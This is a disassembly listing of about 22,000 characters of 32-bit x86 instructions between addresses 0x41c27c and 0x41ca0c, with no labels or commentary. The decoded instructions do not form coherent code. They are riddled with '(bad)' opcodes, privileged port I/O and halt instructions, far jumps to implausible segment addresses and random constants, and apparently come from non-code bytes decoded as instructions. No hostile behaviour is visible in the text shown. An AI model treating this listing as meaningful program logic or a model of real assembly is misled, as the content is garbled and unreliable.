  41c27c:	xchg   esp,eax
  41c27d:	or     BYTE PTR ds:0x61ffb6ab,dh
  41c283:	mov    al,0x36
  41c285:	arpl   bp,di
  41c287:	stc    
  41c288:	cmp    BYTE PTR [eax],al
  41c28a:	fdivr  QWORD PTR [edx]
  41c28c:	xchg   edx,eax
  41c28d:	lea    edx,[edi+0x74451a13]
  41c293:	in     al,dx
  41c294:	pop    DWORD PTR [ebx-0x59710a20]
  41c29a:	push   esp
  41c29b:	rol    DWORD PTR [ecx+0x1a],cl
  41c29e:	mov    bh,0xac
  41c2a0:	mov    ebx,0x2f0cdde6
  41c2a5:	dec    eax
  41c2a6:	in     al,0x2d
  41c2a8:	and    eax,0xd6fa4895
  41c2ad:	test   DWORD PTR [edx-0x7169555b],ecx
  41c2b3:	xor    eax,0x728fe205
  41c2b8:	mov    eax,ds:0xbf4d77db
  41c2bd:	jp     0x41c2bd
  41c2bf:	cld    
  41c2c0:	sbb    BYTE PTR [edx],bh
  41c2c2:	xchg   ebp,eax
  41c2c3:	push   ebp
  41c2c4:	ins    DWORD PTR es:[edi],dx
  41c2c5:	adc    ah,BYTE PTR [ecx+edx*2]
  41c2c8:	mov    esi,0xd1ae778
  41c2cd:	mov    eax,ds:0x75628ccf
  41c2d2:	sub    BYTE PTR [esi+esi*8],0x95
  41c2d6:	retf   0x2a0c
  41c2d9:	out    0x3e,eax
  41c2db:	add    eax,0x9849d6c4
  41c2e0:	add    DWORD PTR [ecx],ebp
  41c2e2:	push   ecx
  41c2e3:	sar    BYTE PTR [edi-0x41],1
  41c2e6:	mov    edi,0xb30aa14d
  41c2eb:	cmp    dh,ch
  41c2ed:	mov    BYTE PTR [ebx+0x48],dl
  41c2f0:	neg    DWORD PTR ds:0x56f63fc3
  41c2f6:	and    esi,0xaa0fce09
  41c2fc:	data16 aam 0x9c
  41c2ff:	inc    DWORD PTR ss:[eax-0x41]
  41c303:	mov    WORD PTR [ebx-0xb],cs
  41c306:	ds and BYTE PTR es:[esi+0x45c871df],dh
  41c30e:	out    0x2f,eax
  41c310:	cmp    esp,DWORD PTR [esi+0x30]
  41c313:	aad    0x72
  41c315:	xchg   edi,eax
  41c316:	pusha  
  41c317:	add    DWORD PTR [eax+0xe9caf09],esp
  41c31d:	hlt    
  41c31e:	adc    eax,0x3f49aa4
  41c323:	fstp   TBYTE PTR [edx-0x4032a7f5]
  41c329:	outs   dx,BYTE PTR ds:[esi]
  41c32a:	lea    edx,[esi]
  41c32c:	adc    ecx,eax
  41c32e:	out    dx,al
  41c32f:	out    dx,eax
  41c330:	fpatan 
  41c332:	add    al,BYTE PTR [ecx]
  41c334:	div    DWORD PTR ds:0x6141fa19
  41c33a:	inc    esi
  41c33b:	pop    edi
  41c33c:	aam    0x1
  41c33e:	repnz les esp,FWORD PTR [ebx+0x3abccb7f]
  41c345:	xor    dh,ah
  41c347:	adc    al,0x57
  41c349:	adc    DWORD PTR [eax-0x5f],0xffffff93
  41c34d:	bnd call 0xe7a89a70
  41c353:	or     al,0x42
  41c355:	icebp  
  41c356:	inc    dl
  41c358:	out    dx,al
  41c359:	dec    ecx
  41c35a:	pop    ebp
  41c35b:	retf   
  41c35c:	test   DWORD PTR [ecx],edx
  41c35e:	xchg   ecx,eax
  41c35f:	fbstp  TBYTE PTR [esp+ebx*2-0x3c]
  41c363:	mov    edi,0x975a7b81
  41c368:	loope  0x41c36a
  41c36a:	rcl    DWORD PTR [ecx],0x4f
  41c36d:	add    al,dl
  41c36f:	mov    esi,0xaee81c79
  41c374:	xchg   edi,eax
  41c375:	push   ebx
  41c376:	outs   dx,DWORD PTR ds:[esi]
  41c377:	out    0x2c,al
  41c379:	pop    ds
  41c37a:	not    dh
  41c37c:	pop    eax
  41c37d:	stc    
  41c37e:	sti    
  41c37f:	mov    ah,0xc4
  41c381:	ja     0x41c3c3
  41c383:	mov    al,al
  41c385:	call   0xf60222a8
  41c38a:	pop    esp
  41c38b:	sub    al,0x74
  41c38d:	inc    edi
  41c38e:	push   ecx
  41c38f:	inc    esi
  41c390:	in     eax,0xf5
  41c392:	push   cs
  41c393:	mov    dl,0xf7
  41c395:	pusha  
  41c396:	push   0x217076df
  41c39b:	mov    ch,0x86
  41c39d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c39e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c39f:	sbb    DWORD PTR [esi-0x77],esp
  41c3a2:	push   ds
  41c3a3:	mov    ch,0xf1
  41c3a5:	ret    
  41c3a6:	jmp    0x979d8e63
  41c3ab:	inc    esp
  41c3ac:	iret   
  41c3ad:	pop    ds
  41c3ae:	jns    0x41c354
  41c3b0:	mov    ds:0x8ccd52bc,al
  41c3b5:	mov    esi,DWORD PTR [ecx]
  41c3b7:	add    al,0x9
  41c3b9:	jg     0x41c411
  41c3bb:	iret   
  41c3bc:	rcl    DWORD PTR [edi+0x8],1
  41c3bf:	mov    ebx,0x45afae43
  41c3c4:	mov    edi,0x4c7c057e
  41c3c9:	add    eax,0x50cae7f8
  41c3ce:	xor    al,0x1d
  41c3d0:	sbb    ebp,DWORD PTR [edx+0x5]
  41c3d3:	mov    ds:0xf480842,al
  41c3d8:	pop    ebx
  41c3d9:	aad    0x76
  41c3db:	fst    QWORD PTR [ecx+0x7600a06b]
  41c3e1:	leave  
  41c3e2:	daa    
  41c3e3:	int3   
  41c3e4:	shl    BYTE PTR [eax+0x5b],cl
  41c3e7:	retf   
  41c3e8:	mov    bl,0x9b
  41c3ea:	adc    BYTE PTR [ebx],dl
  41c3ec:	shl    BYTE PTR [ecx-0x58],1
  41c3ef:	xchg   edi,eax
  41c3f0:	call   0xd35d23a0
  41c3f5:	dec    esi
  41c3f6:	out    0x5,al
  41c3f8:	rol    DWORD PTR [ebx+0x8],cl
  41c3fb:	aad    0x99
  41c3fd:	push   es
  41c3fe:	add    ebp,DWORD PTR [esi]
  41c400:	ffreep st(0)
  41c402:	and    al,0xf0
  41c404:	neg    DWORD PTR ds:0x5ae8d388
  41c40a:	adc    dh,BYTE PTR [ecx+eax*4+0x21a9888e]
  41c411:	das    
  41c412:	xor    al,0x70
  41c414:	fimul  DWORD PTR [ebx+ecx*4-0x703c38f0]
  41c41b:	cwde   
  41c41c:	xchg   DWORD PTR [esi-0x6c],esp
  41c41f:	and    ebp,edx
  41c421:	mov    ebx,0x51cf129d
  41c426:	(bad)  
  41c427:	pop    ds
  41c428:	popf   
  41c429:	jmp    0x41c443
  41c42b:	push   esp
  41c42c:	and    cl,al
  41c42e:	dec    edi
  41c42f:	adc    ebp,DWORD PTR [edi+0x1e]
  41c432:	or     BYTE PTR [ebp*8-0x1ae1a3ad],al
  41c439:	sub    BYTE PTR [edx],dh
  41c43b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c43c:	pop    edi
  41c43d:	mov    eax,0xcc6a3deb
  41c442:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c443:	mov    BYTE PTR [edx],bl
  41c445:	jo     0x41c484
  41c447:	pop    ecx
  41c448:	pop    ebx
  41c449:	jb     0x41c3de
  41c44b:	rcr    BYTE PTR [ecx-0x67],1
  41c44e:	mov    al,0xe4
  41c450:	mov    eax,ds:0x5ec01cce
  41c455:	pop    ss
  41c456:	cdq    
  41c457:	xchg   ecx,eax
  41c458:	adc    eax,0x43c72301
  41c45d:	mov    al,ds:0xbbe4708d
  41c462:	push   ebx
  41c463:	(bad)  
  41c464:	hlt    
  41c465:	sub    DWORD PTR [edi-0x4a],esi
  41c468:	jnp    0x41c4d3
  41c46a:	js     0x41c4ba
  41c46c:	or     BYTE PTR [ecx],al
  41c46e:	fucomp st(6)
  41c470:	mov    gs,WORD PTR [ecx]
  41c472:	ficomp WORD PTR [edx-0x6ab9c452]
  41c478:	add    bl,ah
  41c47a:	retf   0x8dd5
  41c47d:	jg     0x41c420
  41c47f:	leave  
  41c480:	call   0x762f:0xb2053797
  41c487:	cmp    BYTE PTR [edx],0x8c
  41c48a:	(bad)  [ebx+0x40]
  41c48d:	mov    BYTE PTR [ecx+0x4e],bh
  41c490:	push   edx
  41c491:	cdq    
  41c492:	mov    WORD PTR [ebp+0x44],fs
  41c495:	add    DWORD PTR [edi],0x67
  41c498:	es mov cl,0xb3
  41c49b:	outs   dx,BYTE PTR ds:[esi]
  41c49c:	xchg   DWORD PTR [edx+0xdc2312b],esp
  41c4a2:	push   ebp
  41c4a3:	mov    al,0x39
  41c4a5:	mov    al,0xe0
  41c4a7:	xor    al,BYTE PTR [eax-0x26]
  41c4aa:	jg     0x41c4dd
  41c4ac:	and    DWORD PTR [ebx-0x45e712af],0x5f
  41c4b3:	xor    eax,0x90838673
  41c4b8:	cmp    al,0x7e
  41c4ba:	call   0x59f11972
  41c4bf:	shl    esp,cl
  41c4c1:	add    ecx,DWORD PTR [esi+0xc06f0bd]
  41c4c7:	push   es
  41c4c8:	sub    BYTE PTR [edi],0x70
  41c4cb:	aam    0xe0
  41c4cd:	cwde   
  41c4ce:	push   ebx
  41c4cf:	push   edx
  41c4d0:	or     al,0xed
  41c4d2:	jb     0x41c48a
  41c4d4:	xchg   edx,eax
  41c4d5:	adc    edx,esp
  41c4d7:	aad    0x38
  41c4d9:	lea    esi,[edx+0x71f31093]
  41c4df:	dec    DWORD PTR [edi+0x49]
  41c4e2:	inc    edx
  41c4e3:	dec    ebx
  41c4e4:	in     al,0xee
  41c4e6:	dec    esp
  41c4e7:	lahf   
  41c4e8:	cmp    al,0x54
  41c4ea:	repz test BYTE PTR [eax+0x7b0e8da],0x3f
  41c4f2:	fwait
  41c4f3:	mov    BYTE PTR [edi+edi*8+0x36b22b07],ah
  41c4fa:	inc    cl
  41c4fc:	je     0x41c4cf
  41c4fe:	and    BYTE PTR ds:0x3157cf6b,al
  41c504:	mov    cl,0xa1
  41c506:	call   0x2129e41a
  41c50b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c50c:	push   esp
  41c50d:	xchg   DWORD PTR [ecx+0x7d3434ef],ebx
  41c513:	sbb    eax,0x9815705c
  41c518:	loopne 0x41c4bc
  41c51a:	repnz xchg esp,eax
  41c51c:	push   edx
  41c51d:	das    
  41c51e:	xchg   ebp,eax
  41c51f:	add    eax,0xe46651e8
  41c524:	sbb    al,0x62
  41c526:	rol    ah,0xda
  41c529:	icebp  
  41c52a:	(bad)  ds:[ecx+ecx*1+0x74cbd86e]
  41c532:	adc    DWORD PTR [esi+0x39],edi
  41c535:	fsub   st(1),st
  41c537:	adc    DWORD PTR [eax+0x56],edi
  41c53a:	(bad)  
  41c53b:	scas   eax,DWORD PTR es:[edi]
  41c53c:	int    0x59
  41c53e:	pop    esi
  41c53f:	cwde   
  41c540:	(bad)  
  41c541:	ins    BYTE PTR es:[edi],dx
  41c542:	bound  esp,QWORD PTR [ecx-0xa]
  41c545:	jmp    DWORD PTR [ecx+0x1021dc35]
  41c54b:	sub    DWORD PTR ds:[esi-0x24],esp
  41c54f:	add    BYTE PTR [bx-0x63],dh
  41c553:	or     BYTE PTR [edx+0x3f],bl
  41c556:	push   esi
  41c557:	retf   0xe034
  41c55a:	stc    
  41c55b:	iret   
  41c55c:	(bad)  
  41c55e:	call   0x5552a7a6
  41c563:	xchg   ebp,eax
  41c564:	es sbb al,0x81
  41c567:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c568:	mov    cl,0xef
  41c56a:	nop
  41c56b:	xchg   ebp,eax
  41c56c:	pop    ebx
  41c56d:	test   al,0x0
  41c56f:	cdq    
  41c570:	loope  0x41c56d
  41c572:	sub    eax,0x63ddaa12
  41c577:	mov    ch,0x8b
  41c579:	mov    ebp,0xc67af68d
  41c57e:	cdq    
  41c57f:	and    DWORD PTR ds:0x70b9618a,edi
  41c585:	jne    0x41c527
  41c587:	sar    bh,0xe4
  41c58a:	call   0x87179142
  41c58f:	les    ebx,FWORD PTR [edx+eax*4+0x1c]
  41c593:	pop    edx
  41c594:	jmp    0xd02e:0x55a04e8a
  41c59b:	inc    ecx
  41c59c:	in     eax,dx
  41c59d:	int    0x48
  41c59f:	test   eax,0x47b3004f
  41c5a4:	mov    ds:0xb30e5fea,al
  41c5a9:	cdq    
  41c5aa:	and    BYTE PTR [ecx+0xb2f8feb],cl
  41c5b0:	jae    0x41c60e
  41c5b2:	cmp    eax,0x4539c1dd
  41c5b7:	inc    ecx
  41c5b8:	cmp    bh,dh
  41c5ba:	fwait
  41c5bb:	or     BYTE PTR [ebp-0x35],dh
  41c5be:	adc    cl,dh
  41c5c0:	adc    DWORD PTR [ecx],ebx
  41c5c2:	in     eax,dx
  41c5c3:	dec    ecx
  41c5c4:	test   eax,0xe8db07c8
  41c5c9:	aaa    
  41c5ca:	ds sub ah,cl
  41c5cd:	neg    DWORD PTR [ecx]
  41c5cf:	mov    esp,0x8703cc7a
  41c5d4:	push   ds
  41c5d5:	jmp    0xad9e2ded
  41c5da:	jecxz  0x41c55c
  41c5dc:	js     0x41c611
  41c5de:	stc    
  41c5df:	mov    edx,0x8955ce8c
  41c5e4:	pop    esi
  41c5e5:	(bad)  
  41c5e6:	int3   
  41c5e7:	mov    edi,0x8cce5599
  41c5ec:	cwde   
  41c5ed:	in     al,dx
  41c5ee:	es cdq 
  41c5f0:	into   
  41c5f1:	pop    es
  41c5f2:	xlat   BYTE PTR ds:[ebx]
  41c5f3:	mov    esi,0x8e56d0a1
  41c5f8:	xchg   ebx,eax
  41c5f9:	push   edx
  41c5fa:	fadd   st,st(1)
  41c5fc:	add    BYTE PTR [ebp+ecx*8-0x3400b2f0],al
  41c603:	sbb    ecx,eax
  41c605:	pop    ebp
  41c606:	add    BYTE PTR [eax],dl
  41c608:	dec    ecx
  41c609:	jnp    0x41c66f
  41c60b:	push   ss
  41c60c:	mov    bh,BYTE PTR [ebp+0x6d61ce8a]
  41c612:	ret    0x7e96
  41c615:	jge    0x41c659
  41c617:	mov    al,0x18
  41c619:	or     DWORD PTR [edx+0x7],eax
  41c61c:	or     al,0x33
  41c61e:	je     0x41c5ab
  41c620:	add    al,0xfe
  41c622:	ret    
  41c623:	mov    edi,0x536a55ec
  41c628:	sbb    al,0x5c
  41c62a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c62b:	jo     0x41c610
  41c62d:	push   cs
  41c62e:	fwait
  41c62f:	jb     0x41c688
  41c631:	jo     0x41c5fc
  41c633:	fdivr  DWORD PTR [esp+eiz*8+0x2dc642c7]
  41c63a:	or     bl,dl
  41c63c:	cdq    
  41c63d:	nop
  41c63e:	mov    DWORD PTR [ecx],esp
  41c640:	or     eax,0x18fc57f
  41c645:	mov    ah,0xa1
  41c647:	das    
  41c648:	div    esi
  41c64a:	sub    edi,DWORD PTR [edi+0xe]
  41c64d:	mov    cl,0x75
  41c64f:	and    dl,ch
  41c651:	enter  0x89ff,0x77
  41c655:	push   esi
  41c656:	mov    ah,0x35
  41c658:	push   ecx
  41c659:	loop   0x41c6cf
  41c65b:	sub    cl,dl
  41c65d:	mov    al,0x62
  41c65f:	ins    DWORD PTR es:[edi],dx
  41c660:	fldcw  WORD PTR [esi]
  41c662:	mov    bl,0xdd
  41c664:	jmp    0x36464ec3
  41c669:	sahf   
  41c66a:	dec    ebx
  41c66b:	mov    WORD PTR [ebx+0x470c6208],gs
  41c671:	add    al,0xd5
  41c673:	cdq    
  41c674:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c675:	popa   
  41c676:	jle    0x41c68d
  41c678:	mov    al,ch
  41c67a:	or     ah,BYTE PTR [eax-0x4c]
  41c67d:	sbb    DWORD PTR [esi+0x36],esi
  41c680:	mov    ebx,0xabd9f2d6
  41c685:	pop    es
  41c686:	call   0xb66c520d
  41c68b:	jbe    0x41c693
  41c68d:	pop    ebx
  41c68e:	sahf   
  41c68f:	jg     0x41c6ca
  41c691:	aam    0x74
  41c693:	pop    edi
  41c694:	cmp    cl,BYTE PTR [edx-0x1d]
  41c697:	retw   
  41c699:	adc    cl,BYTE PTR [ebx+0x1d]
  41c69c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c69d:	xchg   edx,eax
  41c69e:	sti    
  41c69f:	add    eax,0xa460406f
  41c6a4:	stos   DWORD PTR es:[edi],eax
  41c6a5:	in     eax,dx
  41c6a6:	dec    eax
  41c6a7:	test   ecx,ebp
  41c6a9:	push   ebp
  41c6aa:	in     al,dx
  41c6ab:	mov    bh,0x91
  41c6ad:	cdq    
  41c6ae:	(bad)  [edi-0x39ecf1f]
  41c6b4:	jmp    0x7cfd:0x3009946c
  41c6bb:	mov    DWORD PTR [eax],esi
  41c6bd:	mov    ch,BYTE PTR [eax+0x595dca78]
  41c6c3:	inc    BYTE PTR [eax-0x1f737ccf]
  41c6c9:	mov    ds:0x4de86fd4,al
  41c6ce:	loop   0x41c65e
  41c6d0:	mov    edi,DWORD PTR [edx-0x118c9311]
  41c6d6:	fimul  DWORD PTR [edi-0x5e9b823d]
  41c6dc:	je     0x41c723
  41c6de:	and    dl,bl
  41c6e0:	jns    0x41c6ca
  41c6e2:	inc    ebp
  41c6e3:	dec    eax
  41c6e4:	test   DWORD PTR [eax-0x4f],edx
  41c6e7:	push   ebx
  41c6e8:	loopne 0x41c6ac
  41c6ea:	popa   
  41c6eb:	add    BYTE PTR [ecx+0x795785c1],0x85
  41c6f2:	and    DWORD PTR [eax],ecx
  41c6f4:	ja     0x41c692
  41c6f6:	sar    BYTE PTR [edx-0x1f],0x3b
  41c6fa:	shl    al,0x30
  41c6fd:	xchg   ebp,eax
  41c6fe:	inc    esp
  41c6ff:	add    dh,BYTE PTR [ebx+ebp*8+0x688fb055]
  41c706:	xchg   ebp,eax
  41c707:	repnz add al,0x2f
  41c70a:	xor    dh,BYTE PTR [esi-0x5bc40bf]
  41c710:	stos   BYTE PTR es:[edi],al
  41c711:	mov    ds:0x5eb818cd,al
  41c716:	adc    DWORD PTR [edx+0x65],0x4b
  41c71a:	add    bh,ah
  41c71c:	mov    WORD PTR [ecx-0x44],es
  41c71f:	ja     0x41c71c
  41c721:	and    dh,BYTE PTR [edx-0x73e9ed42]
  41c727:	mov    ebx,0x9f54e2dc
  41c72c:	jmp    0x66f7:0x95e4971a
  41c733:	or     ch,0x93
  41c736:	fwait
  41c737:	xchg   esp,eax
  41c738:	push   es
  41c739:	scas   al,BYTE PTR es:[edi]
  41c73a:	pop    ecx
  41c73b:	xchg   edi,eax
  41c73c:	out    dx,al
  41c73d:	add    cl,BYTE PTR [esi-0x18]
  41c740:	scas   eax,DWORD PTR es:[edi]
  41c741:	add    ecx,DWORD PTR [eax+0x31739752]
  41c747:	rol    BYTE PTR [edx+ecx*2],cl
  41c74a:	arpl   WORD PTR [edx-0x7f],ax
  41c74d:	mov    ds:0x54ffa467,al
  41c752:	in     al,0xa4
  41c754:	mov    ah,0xb
  41c756:	aas    
  41c757:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c758:	loope  0x41c6ff
  41c75a:	(bad)  
  41c75b:	sub    ebp,ebx
  41c75d:	jmp    FWORD PTR [edi]
  41c75f:	ret    
  41c760:	inc    esp
  41c761:	mov    ds,esi
  41c763:	xor    BYTE PTR [edi-0x3d],0x79
  41c767:	out    0x8e,eax
  41c769:	xor    eax,0x18a57f02
  41c76e:	add    al,0x94
  41c770:	sub    BYTE PTR [ebx],bl
  41c772:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c773:	out    0x2a,eax
  41c775:	cmc    
  41c776:	jg     0x41c6ff
  41c778:	(bad)  
  41c779:	out    0xf2,eax
  41c77b:	fcmovu st,st(6)
  41c77d:	(bad)
  41c780:	xor    al,0x84
  41c782:	xchg   DWORD PTR [esi],ecx
  41c784:	fsubr  DWORD PTR [esi]
  41c786:	mov    ch,0x93
  41c788:	adc    edi,eax
  41c78a:	inc    edi
  41c78b:	int    0x6c
  41c78d:	push   eax
  41c78e:	loop   0x41c7a2
  41c790:	mov    bh,0xf3
  41c792:	pop    ds
  41c793:	sbb    edi,0x46f7a37a
  41c799:	aas    
  41c79a:	inc    esi
  41c79b:	imul   DWORD PTR [esi+ecx*4-0x2]
  41c79f:	loop   0x41c730
  41c7a1:	mov    ebp,0x4719676
  41c7a6:	mov    esi,0x13f1b9d9
  41c7ab:	push   es
  41c7ac:	in     al,dx
  41c7ad:	pop    ebx
  41c7ae:	mov    al,0xc6
  41c7b0:	sti    
  41c7b1:	and    ebx,DWORD PTR [edx-0x63]
  41c7b4:	push   ebp
  41c7b5:	in     eax,dx
  41c7b6:	and    ecx,0xd7cc1909
  41c7bc:	retf   
  41c7bd:	shl    esi,0x98
  41c7c0:	outs   dx,BYTE PTR ds:[esi]
  41c7c1:	jb     0x41c80e
  41c7c3:	sbb    DWORD PTR [edx+edx*2+0x23],0xfffffff6
  41c7c8:	pop    DWORD PTR [ebx-0x53]
  41c7cb:	cmp    DWORD PTR [ebp-0x74820349],ebx
  41c7d1:	and    ebx,DWORD PTR [ecx-0x5a70979c]
  41c7d7:	retw   
  41c7d9:	jmp    ebp
  41c7db:	mov    ?,WORD PTR [esi+0x49]
  41c7de:	push   edx
  41c7df:	repnz cwde 
  41c7e1:	mov    eax,ds:0x84d8573a
  41c7e6:	jmp    0x36a80987
  41c7eb:	add    bh,BYTE PTR [ecx-0x7848b807]
  41c7f1:	js     0x41c7b9
  41c7f3:	dec    esi
  41c7f4:	fisubr DWORD PTR [edi-0x130baa2a]
  41c7fa:	push   edx
  41c7fb:	pop    edx
  41c7fc:	sbb    eax,0x14d51c90
  41c801:	bound  eax,QWORD PTR [edi+0x5a]
  41c804:	lahf   
  41c805:	stos   DWORD PTR es:[edi],eax
  41c806:	(bad)  
  41c807:	push   esp
  41c808:	mov    BYTE PTR [eax+ebx*1+0x322ba8a4],0x45
  41c810:	hlt    
  41c811:	mov    BYTE PTR [eax+0x70],dl
  41c814:	jecxz  0x41c7c2
  41c816:	test   ecx,0xd4bad04d
  41c81c:	imul   ebp,DWORD PTR [edi],0x4884c595
  41c822:	xchg   esp,eax
  41c823:	xor    dh,dh
  41c825:	mov    eax,0xb4e5ae37
  41c82a:	aas    
  41c82b:	outs   dx,BYTE PTR ds:[esi]
  41c82c:	daa    
  41c82d:	std    
  41c82e:	xor    al,0x72
  41c830:	pop    ss
  41c831:	jb     0x41c84b
  41c833:	jb     0x41c8a1
  41c835:	sbb    BYTE PTR [ebp+0x4861a24d],bl
  41c83b:	(bad)  
  41c83c:	pop    ecx
  41c83d:	jg     0x41c87f
  41c83f:	sub    DWORD PTR [ebx+edx*8-0x3dab0df0],eax
  41c846:	jnp    0x41c83e
  41c848:	shr    DWORD PTR [ebx-0x51],1
  41c84b:	and    DWORD PTR [esi-0x6],edx
  41c84e:	xchg   esi,esi
  41c850:	retf   
  41c851:	popa   
  41c852:	mov    ds:0xeab83593,eax
  41c857:	rcr    DWORD PTR [ecx-0x1046391c],1
  41c85d:	mov    eax,0x75fe1494
  41c862:	push   ecx
  41c863:	stc    
  41c864:	xchg   ecx,eax
  41c865:	inc    ecx
  41c866:	inc    edi
  41c867:	fst    DWORD PTR [ebp-0x5e]
  41c86a:	xchg   edi,eax
  41c86b:	repz out dx,al
  41c86d:	out    0xd8,eax
  41c86f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c870:	mov    ecx,0xf1bcb65a
  41c875:	sub    esp,DWORD PTR [edi+0x67a66f31]
  41c87b:	cmp    al,0xd
  41c87d:	push   esp
  41c87e:	inc    esp
  41c87f:	stos   DWORD PTR es:[edi],eax
  41c880:	test   al,0x21
  41c882:	ins    BYTE PTR es:[edi],dx
  41c883:	push   ebx
  41c884:	jecxz  0x41c8e5
  41c886:	call   0x3666:0x42e35a3f
  41c88d:	dec    esi
  41c88e:	mov    eax,ds:0x19281771
  41c893:	sub    dl,0xf
  41c896:	mov    bl,0xbc
  41c898:	popa   
  41c899:	int    0xf7
  41c89b:	(bad)  [ebp+0x6f]
  41c89e:	arpl   WORD PTR [ebx+0x2d],bx
  41c8a1:	pushf  
  41c8a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8a3:	xchg   edx,eax
  41c8a4:	jl     0x41c8bf
  41c8a6:	into   
  41c8a7:	arpl   cx,ax
  41c8a9:	cmp    BYTE PTR [eax+eax*8],bl
  41c8ac:	xchg   DWORD PTR [ebp+eax*1+0x61],esp
  41c8b0:	clc    
  41c8b1:	ror    ecx,cl
  41c8b3:	adc    esi,DWORD PTR [ecx+edi*2]
  41c8b6:	inc    esp
  41c8b7:	xor    BYTE PTR [ebx+0x3d],dh
  41c8ba:	dec    ebp
  41c8bb:	stos   DWORD PTR es:[edi],eax
  41c8bc:	pop    esp
  41c8bd:	mov    dl,0xee
  41c8bf:	lea    edx,[edx]
  41c8c1:	ror    bh,cl
  41c8c3:	shl    DWORD PTR [ebx-0x64],0xc4
  41c8c7:	outs   dx,DWORD PTR ds:[esi]
  41c8c8:	pop    es
  41c8c9:	lods   eax,DWORD PTR ds:[esi]
  41c8ca:	iret   
  41c8cb:	stc    
  41c8cc:	(bad)  
  41c8cd:	daa    
  41c8ce:	add    al,BYTE PTR [eax+0x6509c54f]
  41c8d4:	scas   al,BYTE PTR es:[edi]
  41c8d5:	mov    al,ds:0x68d274e2
  41c8da:	jne    0x41c877
  41c8dc:	and    ch,BYTE PTR [eax]
  41c8de:	lahf   
  41c8df:	hlt    
  41c8e0:	sub    eax,0x9353692b
  41c8e5:	js     0x41c8f3
  41c8e7:	and    ebp,esi
  41c8e9:	gs push cs
  41c8eb:	mov    al,0x0
  41c8ed:	push   ecx
  41c8ee:	mov    cl,0xfa
  41c8f0:	mov    eax,0xd6e2cae
  41c8f5:	or     eax,DWORD PTR [eax-0x5a]
  41c8f8:	pop    eax
  41c8f9:	xchg   ebp,eax
  41c8fa:	cli    
  41c8fb:	cmp    eax,0xd3c6d9e5
  41c900:	(bad)  
  41c901:	mov    ebp,0x52c481ac
  41c906:	(bad)  
  41c907:	popf   
  41c908:	mov    esi,0x9bc40bdc
  41c90d:	cmp    eax,0xe4e4936d
  41c912:	retf   0x35f4
  41c915:	dec    ebp
  41c916:	adc    BYTE PTR [ecx+edx*1-0x10087db7],dl
  41c91d:	pop    esp
  41c91e:	aas    
  41c91f:	popf   
  41c920:	mov    al,0x89
  41c922:	retf   0x5039
  41c925:	xchg   DWORD PTR [ebx+0x55],edx
  41c928:	lock mov bl,BYTE PTR [ebx]
  41c92b:	cmp    DWORD PTR [eax+ebp*2+0x72b5f81],edx
  41c932:	hlt    
  41c933:	imul   ecx,edi,0x3b
  41c936:	iret   
  41c937:	stc    
  41c938:	imul   ebx,ebx,0x37b7e88c
  41c93e:	ret    
  41c93f:	addr16 mov edx,0x3b56b700
  41c945:	cmp    al,0x9d
  41c947:	jno    0x41c9bc
  41c949:	out    0xbe,al
  41c94b:	sub    eax,0xd34db28
  41c950:	cmovo  esp,DWORD PTR [edx+ecx*2]
  41c954:	mov    al,gs:0xa0f30c5e
  41c95a:	lea    edx,[ebp-0x4c]
  41c95d:	(bad)  
  41c95e:	cmp    al,0x84
  41c960:	xlat   BYTE PTR ds:[ebx]
  41c961:	jmp    0x41c9ce
  41c963:	jb     0x41c990
  41c965:	jnp    0x41c91d
  41c967:	shr    edx,cl
  41c969:	cli    
  41c96a:	sti    
  41c96b:	jmp    0x98b50e51
  41c970:	jb     0x41c9b7
  41c972:	test   al,0x85
  41c974:	pop    eax
  41c975:	out    dx,eax
  41c976:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c977:	outs   dx,BYTE PTR ds:[esi]
  41c978:	mov    edx,0x37bc73a6
  41c97d:	dec    esp
  41c97e:	or     BYTE PTR [eax+ebp*2],dl
  41c981:	add    eax,0xdf1493b2
  41c986:	rcr    DWORD PTR [esi+0x7d],0x41
  41c98a:	aaa    
  41c98b:	cld    
  41c98c:	imul   ebx,DWORD PTR [eax-0x69b16205],0xe6d4a91c
  41c996:	sub    DWORD PTR [ebx],esp
  41c998:	push   eax
  41c999:	jmp    0xd819:0x5943222b
  41c9a0:	nop
  41c9a1:	mov    al,ds:0x490cbd52
  41c9a6:	retf   0x6baa
  41c9a9:	jl     0x41c97f
  41c9ab:	pop    ss
  41c9ac:	mov    ebx,0xc85bda12
  41c9b1:	inc    esp
  41c9b2:	dec    edi
  41c9b3:	inc    esi
  41c9b4:	test   BYTE PTR [ebx],ch
  41c9b6:	mov    bl,0xe
  41c9b8:	enter  0x4390,0xce
  41c9bc:	pop    edx
  41c9bd:	adc    eax,0x3c3f80bb
  41c9c2:	test   eax,0x337d6fe8
  41c9c7:	sar    BYTE PTR [eax+0x2a775b7e],cl
  41c9cd:	ja     0x41ca2b
  41c9cf:	pop    ecx
  41c9d0:	aad    0x80
  41c9d2:	fcom   QWORD PTR [edi+0x204347dd]
  41c9d8:	push   esp
  41c9d9:	loope  0x41ca11
  41c9db:	jno    0x41ca14
  41c9dd:	pop    ebp
  41c9de:	(bad)  
  41c9df:	(bad)  
  41c9e0:	mov    ds:0xc7a5c695,al
  41c9e5:	int3   
  41c9e6:	push   ecx
  41c9e7:	add    al,0x24
  41c9e9:	jle    0x41ca02
  41c9eb:	idiv   DWORD PTR [edi]
  41c9ed:	xchg   BYTE PTR [ebx+0x1db0843d],ah
  41c9f3:	test   al,0x53
  41c9f5:	and    BYTE PTR [ebx],ch
  41c9f7:	jb     0x41c9ff
  41c9f9:	push   edx
  41c9fa:	lds    edi,FWORD PTR [esi+0x7e8c613d]
  41ca00:	mov    ecx,0x4678e247
  41ca05:	mov    esi,0x2088f7a1
  41ca0a:	in     eax,0x87
  41ca0c:	ins    BYTE PTR es:[edi],dx
